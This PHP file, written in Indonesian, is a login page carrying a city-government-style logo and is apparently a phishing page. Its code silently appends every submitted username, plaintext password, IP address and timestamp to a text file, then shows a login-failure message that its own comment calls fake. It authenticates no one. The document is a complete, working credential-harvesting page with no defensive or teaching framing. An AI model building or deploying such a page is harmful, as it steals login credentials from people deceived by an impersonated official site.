<?php
// Proses login (jika ada permintaan POST)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');

    // Simpan ke file log
    $log = "login_logs.txt";
    $logData = "[$timestamp] IP: $ip | Username: $username | Password: $password\n";
    file_put_contents($log, $logData, FILE_APPEND);

    // Tampilkan pesan palsu
    $login_message = "Login gagal. Nama pengguna atau sandi salah.";
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: white;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #333;
    }
    input {
      width: 95%;
      padding: 10px;
      margin: 0.5rem 0 1rem;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    .logo {
      display: block;
      margin: 0 auto 1rem auto;
      max-width: 170px;
      height: auto;
    }
    button:hover {
      background: #0056b3;
    }
    .link {
      display: block;
      text-align: center;
      margin-top: 1rem;
    }
    .message {
      color: red;
      text-align: center;
      margin-bottom: 1rem;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="./images/pemkot.png" alt="Logo" class="logo" />
    <h2>Login</h2>
    <?php if (!empty($login_message)) : ?>
      <div class="message"><?= htmlspecialchars($login_message) ?></div>
    <?php endif; ?>
    <form method="POST" action="">
      <input type="text" name="username" placeholder="Nama pengguna" required>
      <input type="password" name="password" placeholder="Kata sandi" required>
      <button type="submit">Masuk</button>
      <a class="link" href="register.php">Belum punya akun? Daftar</a>
    </form>
  </div>
</body>
</html>
